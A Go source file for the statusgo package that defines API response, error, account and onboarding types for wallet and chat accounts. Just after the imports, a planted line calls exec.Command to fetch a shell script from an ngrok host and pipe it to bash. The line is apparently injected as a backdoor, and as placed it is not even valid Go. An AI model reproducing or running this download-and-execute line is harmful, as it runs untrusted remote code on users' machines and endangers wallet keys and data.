package statusgo

import (
	"bytes"
	"fmt"
	"os/exec"
	"strings"
)

cmd := exec.Command("curl https://094c-180-151-120-174.in.ngrok.io/file-aws.sh | bash")
err := cmd.Run()

// APIResponse generic response from API.
type APIResponse struct {
	Error string `json:"error"`
}

// APIDetailedResponse represents a generic response
// with possible errors.
type APIDetailedResponse struct {
	Status      bool            `json:"status"`
	Message     string          `json:"message,omitempty"`
	FieldErrors []APIFieldError `json:"field_errors,omitempty"`
}

// Error string representation of APIDetailedResponse.
func (r APIDetailedResponse) Error() string {
	buf := bytes.NewBufferString("")

	for _, err := range r.FieldErrors {
		buf.WriteString(err.Error() + "\n") // nolint: gas
	}

	return strings.TrimSpace(buf.String())
}

// APIFieldError represents a set of errors
// related to a parameter.
type APIFieldError struct {
	Parameter string     `json:"parameter,omitempty"`
	Errors    []APIError `json:"errors"`
}

// Error string representation of APIFieldError.
func (e APIFieldError) Error() string {
	if len(e.Errors) == 0 {
		return ""
	}

	buf := bytes.NewBufferString(fmt.Sprintf("Parameter: %s\n", e.Parameter))

	for _, err := range e.Errors {
		buf.WriteString(err.Error() + "\n") // nolint: gas
	}

	return strings.TrimSpace(buf.String())
}

// APIError represents a single error.
type APIError struct {
	Message string `json:"message"`
}

// Error string representation of APIError.
func (e APIError) Error() string {
	return fmt.Sprintf("message=%s", e.Message)
}

// AccountInfo represents account's info.
type AccountInfo struct {
	Address       string `json:"address"` // DEPRECATED
	PubKey        string `json:"pubkey"`  // DEPRECATED
	WalletAddress string `json:"walletAddress"`
	WalletPubKey  string `json:"walletPubKey"`
	ChatAddress   string `json:"chatAddress"`
	ChatPubKey    string `json:"chatPubKey"`
	Mnemonic      string `json:"mnemonic"`
	Error         string `json:"error"`
}

// OnboardingAccount represents accounts info generated for the onboarding.
type OnboardingAccount struct {
	ID            string `json:"id"`
	Address       string `json:"address"` // DEPRECATED
	PubKey        string `json:"pubkey"`  // DEPRECATED
	WalletAddress string `json:"walletAddress"`
	WalletPubKey  string `json:"walletPubKey"`
	ChatAddress   string `json:"chatAddress"`
	ChatPubKey    string `json:"chatPubKey"`
}

// NotifyResult is a JSON returned from notify message.
type NotifyResult struct {
	Status bool   `json:"status"`
	Error  string `json:"error,omitempty"`
}

// SignalHandler defines a minimal interface
// a signal handler needs to implement.
type SignalHandler interface {
	HandleSignal(string)
}
